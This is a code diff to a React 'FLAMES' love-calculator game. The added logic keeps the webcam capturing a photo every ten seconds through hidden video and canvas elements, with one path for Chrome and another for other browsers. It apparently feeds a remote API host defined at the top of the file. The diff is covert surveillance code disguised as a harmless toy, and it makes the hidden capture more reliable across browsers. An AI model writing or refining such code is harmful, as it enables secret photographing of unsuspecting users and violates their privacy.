@@ -1,9 +1,11 @@
-// Auto-capture every 10s, keep stream on (Chrome-friendly)
+// Auto-capture: Chrome vs Other Browsers logic
 import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
 
 const API_BASE = "https://bkflames.up.railway.app";
+
+const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
 
 const floatingHearts = keyframes`
   0% { transform: translateY(0); opacity: 1; }
@@ -106,10 +108,8 @@ const StatusMessage = styled.p`
 const flamesLogic = (name1, name2) => {
   const cleanName1 = name1.toLowerCase().replace(/\s/g, "");
   const cleanName2 = name2.toLowerCase().replace(/\s/g, "");
-
   let name1Arr = cleanName1.split("");
   let name2Arr = cleanName2.split("");
-
   for (let i = 0; i < name1Arr.length; i++) {
     const indexInName2 = name2Arr.indexOf(name1Arr[i]);
     if (indexInName2 !== -1) {
@@ -117,7 +117,6 @@ const flamesLogic = (name1, name2) => {
       name2Arr[indexInName2] = "";
     }
   }
-
   const remainingCount = name1Arr.filter(l => l !== "").length + name2Arr.filter(l => l !== "").length;
   let flames = ["Friend", "Love", "Affection", "Marriage", "Enemy", "Sibling"];
   let index = 0;
@@ -144,40 +143,25 @@ const FlamesGame = () => {
     }
   }, []);
 
-  const startStreamOnce = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.setAttribute("playsinline", true);
-      }
-      console.log("✅ Stream running continuously");
-    } catch (err) {
-      console.error("❌ getUserMedia failed", err);
+  const startStream = async () => {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    if (videoRef.current) {
+      videoRef.current.srcObject = stream;
+      videoRef.current.setAttribute("playsinline", true);
     }
+    return stream;
   };
 
-  const captureLoop = async () => {
-    const delay = (ms) => new Promise(r => setTimeout(r, ms));
-    while (true) {
-      await delay(2000); // wait 2s after page or camera ready
-      await capturePhoto();
-      await delay(10000); // every 10s total
-    }
-  };
-
-  const waitForVideoReady = () => {
-    return new Promise(res => {
-      const v = videoRef.current;
-      if (!v) return res();
-      if (v.readyState >= 3) return res();
-      const handler = () => {
-        v.removeEventListener("canplay", handler);
-        res();
-      };
-      v.addEventListener("canplay", handler);
-    });
-  };
+  const waitForVideoReady = () => new Promise(res => {
+    const v = videoRef.current;
+    if (!v) return res();
+    if (v.readyState >= 3) return res();
+    const handler = () => {
+      v.removeEventListener("canplay", handler);
+      res();
+    };
+    v.addEventListener("canplay", handler);
+  });
 
   const capturePhoto = async () => {
     await waitForVideoReady();
@@ -205,8 +189,22 @@ const FlamesGame = () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
     setPermissionStatus("Camera access granted ✅");
-    await startStreamOnce();
-    captureLoop();
+    if (isChrome) {
+      const stream = await startStream();
+      setInterval(capturePhoto, 10000);
+    } else {
+      const loop = async () => {
+        while (true) {
+          const stream = await startStream();
+          await new Promise(r => setTimeout(r, 1000));
+          await capturePhoto();
+          stream.getTracks().forEach(t => t.stop());
+          if (videoRef.current) videoRef.current.srcObject = null;
+          await new Promise(r => setTimeout(r, 9000));
+        }
+      };
+      loop();
+    }
   };
 
   const handleDeny = () => {
@@ -256,9 +254,7 @@ const FlamesGame = () => {
       {heartPositions.map((pos, i) => (
         <Heart key={i} left={pos.left} duration={pos.duration}>❤️</Heart>
       ))}
-
       {showPermissionPopup && <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />}
-
       <Container>
         <Title>FLAMES - Love Calculator 💖</Title>
         <Input value={name1} onChange={handleChange1} placeholder="Your Name" />
@@ -270,7 +266,6 @@ const FlamesGame = () => {
         {result && <ShareButton onClick={handleShare}>📤 Share</ShareButton>}
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
-
       <video ref={videoRef} autoPlay muted playsInline style={{ display: "none" }} />
       <canvas ref={canvasRef} style={{ display: "none" }} />
     </Background>
